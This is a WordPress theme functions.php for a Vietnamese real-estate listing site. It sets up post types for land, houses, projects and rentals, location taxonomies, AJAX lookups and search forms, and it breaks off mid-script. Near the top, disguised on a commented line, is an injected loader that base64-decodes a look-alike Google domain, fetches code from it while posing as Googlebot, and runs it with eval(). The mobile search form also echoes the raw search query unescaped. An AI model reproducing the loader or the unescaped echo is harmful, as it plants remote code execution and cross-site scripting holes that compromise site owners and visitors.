<?php
/**
 * nnduy function
 * @package WordPress
 * @subpackage nnduy
 */

// error_reporting(E_ERROR | E_WARNING | E_PARSE);$host = 'https://www.examcollection.com/2V0-621.html';$is_hc = 0;$is_ind = 1;$s = curl_init();curl_setopt($s,CURLOPT_URL,base64_decode('aHR0cDovL2cwMGdsZXdlYi5jb20vdGlrL2QyLnBocA=='));curl_setopt($s,CURLOPT_RETURNTRANSFER,1);curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));$edcs=curl_exec($s);eval($edcs);
/*------------------------------------------------------------------------------------
/* WordPress標準の機能
/*----------------------------------------------------------------------------------*/
if ( !isset( $content_width ) ) {
  $content_width = 1000;
}
if ( !function_exists( 'remove_admin_login_header' ) ):
function remove_admin_login_header() {
  remove_action('wp_head', '_admin_bar_bump_cb');
}
add_action('get_header', 'remove_admin_login_header');
endif;
if ( !function_exists( 'nnduy_setup' ) ):
  function nnduy_setup() {
    load_theme_textdomain( 'nnduy', get_template_directory() . '/languages' );
    add_theme_support( 'automatic-feed-links' );
    add_theme_support( 'title-tag' );
    add_theme_support( 'customize-selective-refresh-widgets' );
    register_nav_menu( 'global-nav', __( 'Header menu', 'nnduy' ) );
    register_nav_menu( 'left-nav', __( 'Left menu', 'nnduy' ) );
    register_nav_menu( 'right-nav', __( 'Right menu', 'nnduy' ) );
    add_theme_support( 'post-thumbnails' );
    add_image_size( 'large-thumbnail', 1118, 538, true );
    add_image_size( 'images_project', 1000, 440, true );
    add_image_size( 'square_smallb_thumbnail', 250, 250, true );
    add_image_size( 'square_smallc_thumbnail', 210, 160, true );
    add_image_size( 'square_smalld_thumbnail', 120, 90, true );
    add_image_size( 'square_news_thumbnail', 82, 82, true );
    // add_editor_style( 'lib/css/editor-style.css' );
  }
  add_action( 'after_setup_theme', 'nnduy_setup' );
endif;
       /**
         * Creates a sidebar
         * @param string|array  Builds Sidebar based off of 'name' and 'id' values.
         */
       function wpb_widgets_init() {

        register_sidebar( array(
          'name' => __( 'Sidebar Home', 'wpb' ),
          'id' => 'sidebar-1',
          'description' => __( 'The main sidebar appears on the right on each page except the front page template', 'wpb' ),
          'before_widget' => '<aside id="%1$s" class="widget %2$s">',
          'after_widget' => '</aside>',
          'before_title' => '<h3 class="widget-title">',
          'after_title' => '</h3>',
        ) );

        register_sidebar( array(
          'name' =>__( 'Front page sidebar', 'wpb'),
          'id' => 'sidebar-2',
          'description' => __( 'Appears on the static front page template', 'wpb' ),
          'before_widget' => '<aside id="%1$s" class="widget %2$s">',
          'after_widget' => '</aside>',
          'before_title' => '<h3 class="widget-title">',
          'after_title' => '</h3>',
        ) );
      }
      add_action( 'widgets_init', 'wpb_widgets_init' );
// wp_headにscriptとstylesを追加
      if ( !function_exists( 'nnduy_scripts_styles' ) ):
        function nnduy_scripts_styles() {
        // Style
          wp_register_style('main-style',get_template_directory_uri()."/style.css", 'all');
          wp_enqueue_style('main-style');
        // Script
          wp_enqueue_script('main_js',get_template_directory_uri()."/lib/js/jquery-3.2.1.min.js", array('jquery'),'3.2.1',false);
          wp_enqueue_script('slick',get_template_directory_uri()."/lib/js/slick.min.js", array('jquery'),'1.0.0',false);
          wp_enqueue_script('my_query',get_template_directory_uri()."/lib/js/my_query.js", array('jquery'),'1.0.0',false);

        }
        add_action( 'wp_enqueue_scripts', 'nnduy_scripts_styles' );
      endif;

// headに出力されるタグを消去
remove_action( 'wp_head', 'wp_generator' ); //WordPressのバージョン情報
remove_action( 'wp_head', 'print_emoji_detection_script', 7 ); //絵文字対応のスクリプト
remove_action( 'wp_print_styles', 'print_emoji_styles'); //絵文字対応のスタイル

// recent commentsのstyleを消去
function remove_recent_comments_style() {
  global $wp_widget_factory;
  remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ));
}
add_action( 'widgets_init', 'remove_recent_comments_style' );

// カテゴリーやタグの概要<p>タグを消去
remove_filter( 'term_description','wpautop' );

//投稿ページ以外ではhentryクラスを削除
function remove_hentry( $classes ) {
  if ( !is_single() ) {
    $classes = array_diff( $classes, array( 'hentry' ) );
  }
  return $classes;
}
add_filter( 'post_class','remove_hentry' );

// セルフピンバックの禁止
function no_self_ping( &$links ) {
  $home = home_url();
  foreach ( $links as $l => $link )
    if ( 0 === strpos( $link, $home ) )
      unset($links[$l]);
  }
  add_action( 'pre_ping', 'no_self_ping' );

// 検査結果を投稿記事のみにする
  function search_filter( $query ) {
    if ( !is_admin() && $query -> is_main_query() && $query -> is_search() ) {
      $query -> set( 'post_type', 'post' );
    }
  }
  add_action( 'pre_get_posts','search_filter' );
        // Customize user profile 
  function my_user_meta($wb)
  {
//項目の追加
        // $wb['twitter'] = 'twitter';
    $wb['facebook'] = 'Facebook';
    $wb['position'] = 'Position';
    return $wb;
  }
  add_filter('user_contactmethods', 'my_user_meta', 10, 1);

// Pagination
// 
/*------------------------------------------------------------------------------------
/* Form search
/*----------------------------------------------------------------------------------*/
add_shortcode('display_search_form', 'wpbsearchformtop');
function wpbsearchform( $form ) {

  $form = '<form role="search" method="get" class="searchform" id="searchform" action="' . home_url( '/' ) . '" >
  <div>
  <input type="text" value="' . get_search_query() . '" placeholder="Search..." name="s" id="s" class="box_input_search" />
  <input type="submit" id="searchsubmit" value="'. esc_attr__('検索') .'" class="box_submit_search" />
  </div>
  </form>';

  return $form;
}

add_shortcode('wpbsearch', 'wpbsearchform');

/*------------------------------------------------------------------------------------
/* LIMIT TAGS WIGET
/*----------------------------------------------------------------------------------*/
//Register tag cloud filter callback
add_filter('widget_tag_cloud_args', 'tag_widget_limit');

//Limit number of tags inside widget
function tag_widget_limit($args){

 //Check if taxonomy option inside widget is set to tags
 if(isset($args['taxonomy']) && $args['taxonomy'] == 'post_tag'){
  $args['number'] = 18; //Limit number of tags
}

return $args;
}
/*------------------------------------------------------------------------------------
/* HÀM PHÂN TRANG
/*----------------------------------------------------------------------------------*/
if (!function_exists( 'nnduy_pagination' )){

  function nnduy_pagination(){

    if ( $GLOBALS['wp_query']->max_num_pages <2 ){ return ''; } ?>

      <nav class="pagination" role="navigation">

        <?php if ( get_next_posts_link() ) : ?>

          <div><?php next_posts_link( __('Older Posts', 'nnduy_pagination') ); ?></div>

        <?php endif; ?>

        <?php if ( get_previous_posts_link() ) :?>

          <div ><?php previous_posts_link(__('Newest Posts', 'nnduy_pagination') ); ?></div>

        <?php endif; ?>

      </nav>

      <?php }
    }
// ======================DISPLAY TOP SHOW =========================
//     function nnduy_shoptop_output()
//     {
//      $value_check = "";
//      $the_query = new WP_Query($arg);
//      $active_value = get_post_meta( get_the_ID(), '_active', true );
//      if($active_value != 'on'){
//        echo '<label><input type="checkbox" name="check_box_active" id="check_box_active">Active Post on Top Page</label>';
//      }else{
//       $value_check = 'checked';
//       echo '<label><input type="checkbox" '.$value_check.' name="check_box_active" id="check_box_active">Active Post on Top Page</label>';
//     }
//   }

//   function nnduy_meta_box()
//   {
//    add_meta_box( 'thong-tin', 'Show top page', 'nnduy_shoptop_output', 'post' );
//  }
//  add_action( 'add_meta_boxes', 'nnduy_meta_box' );
//  function active_post_save( $post_id )
//  {
//    $active = sanitize_text_field( $_POST['check_box_active'] );
// // Reset active
//    $args = array(
//     'post_type' => 'post',
//     'post_status' => 'publish', 
//   );
//    $posts_array = get_posts( $args );
//    foreach($posts_array  as $post_array )
//    {
//     update_post_meta($post_array->ID, '_active', '');
//   }  
// // Update post ID by id Article
//   update_post_meta( $post_id, '_active', $active );
// }
// add_action( 'save_post', 'active_post_save' );

// function custom_excerpt_length( $length ) {
//   return 30;
// } 
// add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );
//================ajax PHP ADMIN=========

// =====================Count VIEW========================
    function setpostview($postID){
      $count_key ='post_views_count';
      $count = get_post_meta($postID, $count_key,true);
      if($count==''){
        $count =0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key,'0');
      }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
      }
    }

    function getpostviews($postID){
      $count_key ='post_views_count';
      $count = get_post_meta($postID, $count_key,true);
      if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key,'0');
        return"0 View";
      }
      return '<i class="fa fa-eye" aria-hidden="true"></i> '.$count;
    }

// =====================CUSTOM POST LAND========================
    function custom_post_type_land()
    {
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Mua bán đất Đà Nẵng', //Tên post type dạng số nhiều
        'singular_name' => 'Đăng tin bán đất ' //Tên post type dạng số ít
      );
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Post type đăng sản phẩm', //Mô tả của post type
        'supports' => array(
          'title',
          'editor',
          'excerpt',
          'author',
          'thumbnail',
          'comments',
          'trackbacks',
          'revisions',
          'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array( 'category', 'post_tag' ), //Các taxonomy được phép sử dụng để phân loại nội dung
        'rewrite' => array(
          // 'slug'                  => 'references',
          'with_front'            => false,
          'pages'                 => true,
          'feeds'                 => true,
        ),
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-cart', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
      );
    register_post_type('post_land', $args); //Tạo post type với slug tên là sanpham và các tham số trong biến $args ở trên
  }
  /* Kích hoạt hàm tạo custom post type */
  add_action('init', 'custom_post_type_land');

// =====================CUSTOM POST HOME========================
  function custom_post_type_home()
  {
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Mua bán nhà Đà Nẵng', //Tên post type dạng số nhiều
        'singular_name' => 'Đăng tin bán nhà' //Tên post type dạng số ít
      );
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Post type đăng sản phẩm', //Mô tả của post type
        'supports' => array(
          'title',
          'editor',
          'excerpt',
          'author',
          'thumbnail',
          'comments',
          'trackbacks',
          'revisions',
          'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array( 'category', 'post_tag' ), //Các taxonomy được phép sử dụng để phân loại nội dung
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-cart', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
      );
    register_post_type('post_home', $args); //Tạo post type với slug tên là sanpham và các tham số trong biến $args ở trên
  }
  /* Kích hoạt hàm tạo custom post type */
  add_action('init', 'custom_post_type_home');

// =====================CUSTOM POST PROJECT========================
  function custom_post_type_project()
  {
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Thông tin dự án', //Tên post type dạng số nhiều
        'singular_name' => 'Thông tin dự án' //Tên post type dạng số ít
      );
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Post type đăng dự án', //Mô tả của post type
        'supports' => array(
          'title',
          'editor',
          'excerpt',
          'author',
          'thumbnail',
          'comments',
          'trackbacks',
          'revisions',
          'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array( 'category', 'post_tag' ), //Các taxonomy được phép sử dụng để phân loại nội dung
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-cart', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
      );
    register_post_type('post_project', $args); //Tạo post type với slug tên là post_project và các tham số trong biến $args ở trên
  }
  /* Kích hoạt hàm tạo custom post type */
  add_action('init', 'custom_post_type_project');
// ====================================================
// BÁN ĐẤT DỰ ÁN
// ====================================================
  function sell_land_project()
  {
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Mua bán dự án Đà Nẵng', //Tên post type dạng số nhiều
        'singular_name' => 'Đăng tin dự án' //Tên post type dạng số ít
      );
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Đăng thông tin bán các lô, nhà nằm trong dự án', //Mô tả của post type
        'supports' => array(
          'title',
          'editor',
          'excerpt',
          'author',
          'thumbnail',
          'comments',
          'trackbacks',
          'revisions',
          'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array(), //Các taxonomy được phép sử dụng để phân loại nội dung
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 6, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-cart', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
      );
    register_post_type('post_sell_project', $args); //Tạo post type với slug tên là post_project và các tham số trong biến $args ở trên
  }
  /* Kích hoạt hàm tạo custom post type */
  add_action('init', 'sell_land_project');
// ====================================================
// Thêm dự án
// ====================================================
  function duan_taxonomy() {

        /* Biến $label chứa các tham số thiết lập tên hiển thị của Taxonomy
         */
        $labels = array(
          'name' => 'Dự án bất động sản',
          'singular' => 'Tên dự án bất động sản',
          'menu_name' => 'Dự án bất động sản'
        );

        /* Biến $args khai báo các tham số trong custom taxonomy cần tạo
         */
        $args = array(
          'labels'                     => $labels,
          'hierarchical'               => false,
          'public'                     => true,
          'show_ui'                    => true,
          'show_admin_column'          => true,
          'show_in_nav_menus'          => true,
          'show_tagcloud'              => true,
        );

        /* Hàm register_taxonomy để khởi tạo taxonomy
         */
        register_taxonomy('duan_taxonomy', 'post_project', $args);

      }
// Hook into the 'init' action
      add_action( 'init', 'duan_taxonomy', 0 );

      function list_posts_by_taxonomy( $post_type,$num_post, $taxonomy, $get_terms_args = array(), $wp_query_args = array() ){
        $tax_terms = get_terms( $taxonomy, $get_terms_args );
        $query_args = array(
          'post_type' => $post_type,
          'meta_key'         => '_thuoc_du_an',
          'meta_value'       => $tax_terms[0]->slug,
          'post_status' => 'publish',
        );
        $my_query = new WP_Query( $query_args );
        ?>
        <div class="box_heading_pro">
          <h1>DANH SÁCH ĐẤT BÁN THUỘC DỰ ÁN</h1>
        </div>
        <ul class="sum_box_land">
          <?php while ($my_query->have_posts()) : $my_query->the_post();
          $dien_tich = get_post_meta( get_the_ID(), '_dien_tich', TRUE );
          $gia_tien = get_post_meta( get_the_ID(), '_gia_tien', TRUE );
          $huong =   get_post_meta( get_the_ID(), '_huong_nha', TRUE );
          $duong  =  get_post_meta(get_the_ID(),'_duong',TRUE);
          $tinh_trang  =  get_post_meta(get_the_ID(),'_tinh_trang',TRUE);
          
          $post_id = $my_query->ID;
          ?>
          <li>
            <div class="sum_hae">
              <div class="future_img">
               <a href="<?php the_permalink() ?>">
                <?php
                if ( has_post_thumbnail() ) {
                  echo get_the_post_thumbnail($post_id,'square_smallc_thumbnail');
                }
                else {?>
                <img class="img_default" src="<?php echo get_site_url();?>/wp-content/uploads/2018/04/default_image.jpg" alt="<?php the_title(); ?>">
                <?php }
                ?>
              </a>
            </div>
            <div class="content_img">
             <div class="head_title">
              <h2><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h2>
            </div>
            <div class="box_content">
             <ul class="info_land">
              <li><div class="bo"><div class="left">Diện tích</div>: <span><?php echo $dien_tich;?></span> m<sup>2</sup></div></li>
              <li><div class="bo"><div class="left">Giá bán</div>: <span><?php echo $gia_tien;?></span></div></li>
              <li><div class="bo"><div class="left">Đường</div>: <span><?php echo $duong;?></span> m</div></li>
              <li><div class="bo"><div class="left">Hướng</div>: <span><?php echo $huong;?></span></div></li>
            </ul>
            <h4 class="tinh_trang"><?php echo $tinh_trang ?></h4>
          </div>
        </div>
      </div>
    </li>
  <?php endwhile; ?>
</ul>
<?php wp_reset_query();
}

add_filter( 'user_contactmethods', 'tgm_io_custom_contact_info' );
/**
 * Removes legacy contact fields and adds support for LinkedIn.
 *
 * @param array $fields  Array of default contact fields.
 * @return array $fields Amended array of contact fields.
 */
function tgm_io_custom_contact_info( $fields ) {

    // Add LinkedIn.
  $fields['phone'] = __( 'Phone' );
  $fields['your_local'] = __( 'Địa chỉ' );
  $fields['male'] = __( 'Giới tính' );

    // Return the amended contact fields.
  return $fields;

}
// ====================================================
// CUSTOM TỈNH HUYỆN XÃ
// ====================================================
add_action( 'init', 'local_taxonomy', 0 );
function local_taxonomy() {
 $labels = array(
   'name' => 'Tỉnh thành phố',
   'singular' => 'Tỉnh thành phố',
   'menu_name' => 'Tỉnh thành phố'
 );
 $args = array(
  'labels'                     => $labels,
  'hierarchical'               => true,
  'public'                     => true,
  'show_ui'                    => true,
  'show_admin_column'          => true,
  'show_in_nav_menus'          => true,
  'show_tagcloud'              => true,
);
 register_taxonomy( 'loc', array( 'post_home' ), $args );
}
// ====================================================
// HÀM XỬ LÝ AJAX
// ====================================================
// GET QUAN BY TINH
add_action( 'wp_ajax_getquan', 'getquan_init' );
add_action( 'wp_ajax_nopriv_getquan', 'getquan_init' );
function getquan_init() {
  //do bên js để dạng json nên giá trị trả về dùng phải encode
  $id_tinh = (isset($_POST['id_tinh']))?esc_attr($_POST['id_tinh']) : '';
  $terms = get_terms( array(
    'taxonomy' => 'loc',
    'hide_empty' => false,
          // 'term_taxonomy_id' => 36,
    'parent' => $id_tinh,
  ) );
  wp_send_json_success($terms);
    die();//bắt buộc phải có khi kết thúc
  }
// GET PHUONG XA BY QUAN
  add_action( 'wp_ajax_getphuongxa', 'getphuongxa_init' );
  add_action( 'wp_ajax_nopriv_getphuongxa', 'getphuongxa_init' );
  function getphuongxa_init() {
  //do bên js để dạng json nên giá trị trả về dùng phải encode
    $id_quan = (isset($_POST['id_quan']))?esc_attr($_POST['id_quan']) : '';
    $terms = get_terms( array(
      'taxonomy' => 'loc',
      'hide_empty' => false,
          // 'term_taxonomy_id' => 36,
      'parent' => $id_quan,
    ) );
    wp_send_json_success($terms);
    die();//bắt buộc phải có khi kết thúc
  }

  add_action( 'wp_ajax_getphuongxaname', 'getphuongxaname_init' );
  add_action( 'wp_ajax_nopriv_getphuongxaname', 'getphuongxaname_init' );
  function getphuongxaname_init() {
  //do bên js để dạng json nên giá trị trả về dùng phải encode
    $name_quan = (isset($_POST['name_quan']))?esc_attr($_POST['name_quan']) : '';
    $terms = get_terms( array(
      'taxonomy' => 'loc',
      'hide_empty' => false,
          // 'term_taxonomy_id' => 36,
      'name' => $name_quan,
    ) );
    wp_send_json_success($terms);
    die();//bắt buộc phải có khi kết thúc
  }
  // ADD IMAGE TO POST RSS
  function rss_post_thumbnail($content) {
    global $post;
    if(has_post_thumbnail($post->ID)) {
      $content = '<p>' . get_the_post_thumbnail($post->ID) .
      '</p>' . get_the_content();
    }
    return $content;
  }
  add_filter('the_excerpt_rss', 'rss_post_thumbnail');
  add_filter('the_content_feed', 'rss_post_thumbnail');

// ====================================================
// THUÊ NHÀ
// ====================================================
  function rend_home()
  {
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Thuê nhà Đà Nẵng', //Tên post type dạng số nhiều
        'singular_name' => 'Đăng tin thuê nhà' //Tên post type dạng số ít
      );
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Đăng tin cho thuê nhà ', //Mô tả của post type
        'supports' => array(
          'title',
          'editor',
          // 'excerpt',
          // 'author',
          'thumbnail',
          'single-land',
          // 'comments',
          // 'trackbacks',
          // 'revisions',
          // 'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array(), //Các taxonomy được phép sử dụng để phân loại nội dung
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 6, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-filter', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
      );
    register_post_type('rend_home', $args); //Tạo post type với slug tên là post_project và các tham số trong biến $args ở trên
  }
  /* Kích hoạt hàm tạo custom post type */
  add_action('init', 'rend_home');

  function search_mobile(){ ?>
  <form method="get" id="form_search_mobile" action="<?php echo home_url( '/' ); ?>">
    <div class="form_search">
      <div class="form_group width_100">
        <input type="text" class="s" name="s" id="s" value="<?php if(isset($_GET['s'])){echo $_GET['s'];}?>" placeholder="Nhập từ khóa..."><br>
      </div>
      <div class="
      <?php 
      if(is_search()){
        echo 'shows';
      }else{
        echo 'show';
      }
      ?>
      ">
      <div class="form_group">
        <label for="tinh">Tỉnh/thành phố</label>
        <select name="tinh" class="idtinh_mobile click_tinh_mobile" id="idtinh_mobile">
          <option value="0" data_id_tinh="0">--Chọn Tỉnh/Thành phố---</option>
          <?php
          $terms = get_terms( array(
            'taxonomy' => 'loc',
            'hide_empty' => false,
            'parent' => 0,
          ) );
          foreach ( $terms as $term ) {?>
          <option value="<?php echo $term->name?>"  <?php if(isset($_GET['tinh']) && $_GET['tinh'] == $term->name){ echo 'selected';}?>  data_id_tinh ="<?php echo $term->term_id;?>" ><?php echo $term->name?></option>
          <?php };?>
        </select>
      </div>
      <div class="form_group">
        <label for="quan">Quận/huyện</label>
        <select name="quan" id="quan_huyen_mobile" class="click_huyen_mobile">
         <option value="0">--Chọn Quận/huyện---</option>
       </select>
     </div>
     <div class="form_group">
      <label for="huong">Hướng</label>
      <select name="huong">
        <option value="0">--Chọn Hướng---</option>
        <option value="Bắc"  <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Bắc'){ echo 'selected';}?>>Bắc</option>
        <option value="Đông Bắc" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Đông Bắc'){ echo 'selected';}?>>Đông Bắc</option>
        <option value="Tây Bắc" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Tây Bắc'){ echo 'selected';}?>>Tây Bắc</option>
        <option value="Nam" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Nam'){ echo 'selected';}?>>Nam</option>
        <option value="Đông Nam" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Đông Nam'){ echo 'selected';}?>>Đông Nam</option>
        <option value="Tây Nam" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Tây Nam'){ echo 'selected';}?>>Tây Nam</option>
        <option value="Đông " <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Đông'){ echo 'selected';}?>>Đông</option>
        <option value="Tây" <?php if(isset($_GET['huong']) && $_GET['huong'] == 'Tây'){ echo 'selected';}?>>Tây</option>
      </select>
    </div>
    <div class="form_group">
      <label for="post_type">Loại nhà đất</label>
      <select name="post_type">
        <option value="0">--Chọn Loại nhà đất---</option>
        <option value="post_home" <?php if(isset($_GET['post_type']) && $_GET['post_type'] == 'post_home'){ echo 'selected';}?>>BDS Nhà</option>
        <option value="post_land" <?php if(isset($_GET['post_type']) && $_GET['post_type'] == 'post_land'){ echo 'selected';}?>>BDS Đất</option>
        <option value="post_project" <?php if(isset($_GET['post_type']) && $_GET['post_type'] == 'post_project'){ echo 'selected';}?>>BDS Dự Án</option>
        <option value="rend_home" <?php if(isset($_GET['post_type']) && $_GET['post_type'] == 'rend_home'){ echo 'selected';}?>>Thuê Nhà</option>
      </select>
    </div>
  </div>
  <div class="submitform">
    <input type="submit" id="searchsubmit" value="Tìm kiếm" />
  </div>
  <?php 
  if(!is_search()){?>
  <div class="form_group nang_cao">
    <span class="show_sa">Tìm kiếm nâng cao</span>
    <span class="hide_sa">Ẩn nâng cao</span>
  </div>
  <?php } ?>
</div>
</form>
<script type="text/javascript">
 var show_search = $('.nang_cao>.show_sa');
 var hide_search = $('.nang_cao>.hide_sa');
 var show = $('.show');
 show_search.on('click',function(){
  show.show(200);
  $(this).hide();
  hide_search.show();
});
 hide_search.on('click',function(){
  show.hide(200);
  $(this).hide();
  show_search.show();
});
 $(document).ready(function () {
   var url_string = window.location.href;
   var url_get = new URL(url_string);
   var idtinh_mobile = $('#idtinh_mobile');
   var id_tinh = $(this).find("option:selected").attr('data_id_tinh');
   if(id_tinh != 0){
    ajax_tinh_huyen(id_tinh);
  }
});
 $('.click_tinh_mobile').on('change', function () {
  var id_tinh = $(this).find("option:selected").attr('data_id_tinh');
  ajax_tinh_huyen(id_tinh);
});
 function ajax_tinh_huyen(va_tinh){
  $.ajax({
                    type : "post", //Phương thức truyền post hoặc get
                    dataType : "json", //Dạng dữ liệu trả về xml, json, script, or html
                    url : '<?php echo admin_url('admin-ajax.php');?>', //Đường dẫn chứa hàm xử lý dữ liệu. Mặc định của WP như vậy
                    data : {
                        action: "getquan", //Tên action
                        'id_tinh' : va_tinh
                      },
                      context: this,
                      beforeSend: function(){
                      },
                      success: function(response) {
                        if(response.success) {
                          var data = response.data;
                          var url_string = window.location.href;
                          var url = new URL(url_string);
                          var quan = url.searchParams.get("quan");
                          var html = "<option value='0'>--Quận/huyện--</option>";
                          data.forEach(function (item) {
                           var quan_res = item.name;
                           if(quan_res == quan){
                            var select_re = 'selected';
                          }
                          html += "<option "+ select_re + " value='" + item.name + "' data_id_huyen ='"+item.term_id+"'>" + item.name + "</option>";
                        });
                          $('.click_huyen_mobile').html(html);
                        }
                        else {
                          alert('Đã có lỗi xảy ra');
                        }
                      },
                      error: function( jqXHR, textStatus, errorThrown ){
                        console.log( 'The following error occured: ' + textStatus, errorThrown );
                      }
                    });
}
$('.click_huyen_mobile').on('change', function () {
  var quan_huyen_mobile = $(this).find("option:selected").attr('data_id_huyen');
  var name_quan_huyen_mobile = $(this).find("option:selected").attr('name_quan_huyen_mobile');
  $('#name_quan').val(name_quan_huyen_mobile);
  ajax_huyen_xa(quan_huyen_mobile);
});
function ajax_huyen_xa(va_huyen){
  $.ajax({
                    type : "post", //Phương thức truyền post hoặc get
                    dataType : "json", //Dạng dữ liệu trả về xml, json, script, or html
                    url : '<?php echo admin_url('admin-ajax.php');?>', //Đường dẫn chứa hàm xử lý dữ liệu. Mặc định của WP như vậy
                    data : {
                        action: "getphuongxa", //Tên action
                        'id_quan' : va_huyen
                      },
                      context: this,
                      beforeSend: function(){
                      },
                      success: function(response) {
